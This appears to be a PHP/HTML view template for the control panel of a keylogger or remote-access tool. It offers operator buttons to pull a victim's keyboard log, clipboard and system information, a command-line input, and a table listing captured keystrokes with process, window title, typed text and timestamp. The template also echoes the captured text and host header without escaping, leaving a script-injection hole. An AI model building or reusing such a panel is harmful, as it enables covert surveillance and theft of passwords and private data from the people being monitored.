<style>
    #header {
        height: 50px;
        width: 100%;
        background-color: dimgray;
    }
    #mainTable {
        width:900px;
        top:0px;
        left:0px;
        margin: auto;
    }

    .getButton {
        font-size: 16pt;
        height:50px;
        text-align: center;
        cursor: pointer;
        margin:4px;
    }
    #divId{
        display: inline-block;
    }
    #answerBox {
        margin-left: 4px;
        position: relative;
        top:0;
        height:450px;
        overflow: scroll;
    }
    #consoleChar {
        display: inline-block;
        font-size: 45pt;
        height: 3px;
        width:9px;
        background-color: black;
        margin-left: 1px;
    }
    #comandLine {
        display: inline-block;
        height: 20px;
        width: 100%;
    }
    #headerList td{
        cursor: default;
    }
    .userList tr td {
        vertical-align: middle;
        line-height: 1;
        padding: 1px 8px;
        height: 35px;
        font-size: .9em;
        cursor: pointer;
    }

</style>


<div class="block-overflow">
    <table id='mainTable' >
        <tr>
            <td>
                <div id ='header'></div>
            </td>
        </tr>
        <tr>
            <td>
                <table border='1' width='100%'>
                    <tr>
                        <td colspan='2'>
                            <h2 align='center'>id: <div id='divId'><?php echo $data['data']['shaId'] ;?></div></h2>
                        </td>
                    </tr>
                    <tr>
                        <td >
                            <div class='getButton' title='get-data systeminfo'>get-data systeminfo</div>
                        </td>
                        <td rowspan='6' width='70%' id='answerTd'>
                            <div id='answerBox'></div>

                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton' title='get-data keyboard'>get-data keyboard</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'  title='get-data clipboard'>get-data clipboard</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'>get-data systeminfo</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'>get-data systeminfo</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'>get-data systeminfo</div>
                        </td>
                    </tr>
                    <tr>
                        <td colspan='2'>
                            <div ><input autofocus id="comandLine"></div>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>

            </td>
        </tr>
    </table>
</div>

<!--TEST-->
<div id="hide" style="background-color:#aaaaaa; display: block;width: 100px;margin: 5px;text-align: center; cursor: pointer">hide</div>
<div id="show" style="background-color: #aaaaaa; display: block;width: 100px;margin: 5px; text-align: center; cursor: pointer">show</div>

<table width="100%" style="table-layout:fixed;">
    <?php
        echo "<tr>
                <th width='15%'><a href='http://".$_SERVER['HTTP_HOST']."/userControl/index/?id=".$data['id']."&orderBy=process'>process</a></th>
                <th width='25%'><a href='http://".$_SERVER['HTTP_HOST']."/userControl/index/?id=".$data['id']."&orderBy=title'>title</a></th>
                <th width='37%'><a href='http://".$_SERVER['HTTP_HOST']."/userControl/index/?id=".$data['id']."&orderBy=text'>text</a></th>
                <th width='23%'><a href='http://".$_SERVER['HTTP_HOST']."/userControl/index/?id=".$data['id']."&orderBy=eventTime'>eventTime</a></th>
               </tr>"
    ?>
    <?php
    $keyboard = $data['keyboard'];
    foreach($keyboard as $key => $row )
    {
    echo "<tr>
        <td>".$row['process']."</td>
        <td>".$row['title']."</td>
        <td class='savedText' style='word-break:break-all;'>".$row['text']."</td>
        <td style='white-space: nowrap;'>".$row['eventTime']."</td>
    </tr>";
    }
    ?>
</table>

<script src="/js/jquery.js"></script>
<script src="/js/userControl.js"></script>

